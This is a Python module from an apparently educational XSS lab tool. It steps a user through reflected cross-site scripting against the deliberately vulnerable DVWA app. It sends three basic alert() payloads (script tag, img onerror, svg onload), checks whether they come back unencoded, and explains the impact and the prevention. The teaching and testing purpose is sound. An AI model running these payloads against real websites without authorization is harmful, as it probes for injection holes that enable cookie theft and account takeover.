"""
Reflected XSS module for XSS Lab Tool.
Demonstrates and teaches reflected (non-persistent) XSS attacks.
"""

from typing import Optional, List, Tuple
from ..explanations.text_blocks import XSSExplanations


class ReflectedXSSModule:
    """Interactive module for teaching Reflected XSS."""

    def __init__(self, http_client, logger, target_config):
        """
        Initialize Reflected XSS module.

        Args:
            http_client: HTTPClient instance
            logger: DualLogger instance
            target_config: TargetConfig instance
        """
        self.http = http_client
        self.logger = logger
        self.config = target_config
        self.explanations = XSSExplanations()

        # DVWA reflected XSS page path
        self.xss_reflected_path = "vulnerabilities/xss_r/"

        # Payloads in order of escalation
        self.payloads = [
            ("<script>alert(1)</script>", "PAYLOAD_BASIC_ALERT"),
            ("<img src=x onerror=alert(1)>", "PAYLOAD_IMG_ONERROR"),
            ("<svg/onload=alert(1)>", "PAYLOAD_SVG_ONLOAD"),
        ]

    def run_interactive(self, interactive: bool = True) -> bool:
        """
        Run the reflected XSS module interactively.

        Args:
            interactive: If True, pause for user confirmation at key steps

        Returns:
            True if at least one payload succeeded
        """
        self.logger.educational("", "REFLECTED XSS MODULE")
        self.logger.educational(self.explanations.REFLECTED_XSS_INTRO)

        # Step 1: Introduce the vulnerability
        self.logger.step(
            1,
            "Understanding the Target",
            "We're going to examine DVWA's Reflected XSS page. This page takes a 'name' "
            "parameter and displays it back to the user without proper sanitization."
        )

        if interactive and not self._get_user_approval("Proceed to examine the vulnerable page?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 2: Send benign request to show reflection
        self.logger.step(
            2,
            "Testing Normal Behavior",
            "First, let's send a normal, non-malicious input to see how the page behaves."
        )

        url = self.config.get_dvwa_url(self.xss_reflected_path)
        test_input = "TestUser123"

        response = self.http.get(url, params={'name': test_input})

        if not response:
            self.logger.explain_failure(
                "Failed to reach target page",
                "The HTTP request to the reflected XSS page failed. This could be due to:\n"
                "  - DVWA not running\n"
                "  - Incorrect URL\n"
                "  - Network connectivity issues",
                "Verify DVWA is running and accessible"
            )
            return False

        if test_input in response.text:
            self.logger.educational(f"\n✓ Input '{test_input}' was reflected in the response")
            self.logger.educational(
                "This means the server is taking our input and including it directly in the HTML.\n"
                "If it's not encoded properly, we can inject malicious code."
            )
        else:
            self.logger.educational(
                f"\n⚠ Expected input '{test_input}' not found in response.\n"
                "The page structure may have changed, or security level may be too high."
            )

        if interactive and not self._get_user_approval("\nProceed to attempt XSS payloads?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 3: Explain impact before attempting
        self.logger.educational(self.explanations.REFLECTED_XSS_IMPACT)

        # Step 4: Attempt payloads
        success = False
        for i, (payload, explanation_key) in enumerate(self.payloads, start=1):
            if self._attempt_payload(payload, explanation_key, i, interactive):
                success = True
                break

        # Step 5: Prevention education
        if success:
            self.logger.educational("\n" + "="*70)
            self.logger.educational(self.explanations.REFLECTED_XSS_PREVENTION)

        return success

    def _attempt_payload(self, payload: str, explanation_key: str, attempt_num: int, interactive: bool) -> bool:
        """
        Attempt a single XSS payload.

        Args:
            payload: The XSS payload to try
            explanation_key: Key for payload explanation
            attempt_num: Attempt number for display
            interactive: Whether to ask for confirmation

        Returns:
            True if payload succeeded
        """
        self.logger.step(
            3 + attempt_num,
            f"Attempting Payload {attempt_num}",
            f"Let's try injecting malicious JavaScript using this payload:"
        )

        # Show and explain payload
        explanation = self.explanations.get_explanation(explanation_key)
        self.logger.payload(payload, explanation)

        if interactive and not self._get_user_approval(f"\nExecute this payload?"):
            self.logger.educational("Payload skipped by user.\n")
            return False

        # Execute the payload
        url = self.config.get_dvwa_url(self.xss_reflected_path)
        response = self.http.get(url, params={'name': payload})

        if not response:
            self.logger.explain_failure(
                f"HTTP request failed for payload {attempt_num}",
                "Could not connect to target",
                "Check DVWA connectivity"
            )
            return False

        # Check if payload succeeded
        if self.http.check_xss_reflection(response, payload):
            self.logger.explain_success(
                f"Payload {attempt_num} succeeded!",
                f"The payload '{payload}' appeared unencoded in the HTML response. "
                f"This means a browser would execute it as JavaScript code.\n\n"
                f"In a real attack scenario:\n"
                f"  1. Attacker sends victim a link with this payload\n"
                f"  2. Victim clicks the link\n"
                f"  3. Server reflects the payload in response\n"
                f"  4. Victim's browser executes malicious JavaScript\n"
                f"  5. Attacker can steal cookies, credentials, or perform actions as victim"
            )
            return True
        else:
            self.logger.explain_failure(
                f"Payload {attempt_num} was blocked or encoded",
                "The payload did not appear in its original form in the response. "
                "This suggests the application is either:\n"
                "  - Encoding special characters (< becomes &lt;)\n"
                "  - Filtering/removing dangerous strings\n"
                "  - Operating at a higher security level",
                f"Try a different payload that may bypass the filter" if attempt_num < len(self.payloads) else None
            )

            # Show snippet of how it was encoded/blocked
            self._show_response_snippet(response, payload)

        return False

    def _show_response_snippet(self, response, payload: str):
        """Show relevant snippet of response around where payload should be."""
        from bs4 import BeautifulSoup

        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            # Look for the response message area
            pre_tag = soup.find('pre')
            if pre_tag:
                snippet = pre_tag.get_text()
                self.logger.educational(f"\nResponse snippet: {snippet}\n")
        except Exception:
            pass

    def _get_user_approval(self, prompt: str) -> bool:
        """
        Ask user for approval to proceed.

        Args:
            prompt: Prompt to display

        Returns:
            True if user approves, False otherwise
        """
        try:
            response = input(f"\n{prompt} [y/N]: ").strip().lower()
            self.logger.operational(f"User response to '{prompt}': {response}", "INFO")
            return response in ['y', 'yes']
        except (KeyboardInterrupt, EOFError):
            self.logger.operational("User interrupted", "INFO")
            return False

    def get_target_url(self) -> str:
        """Get the full URL for the reflected XSS page."""
        return self.config.get_dvwa_url(self.xss_reflected_path)
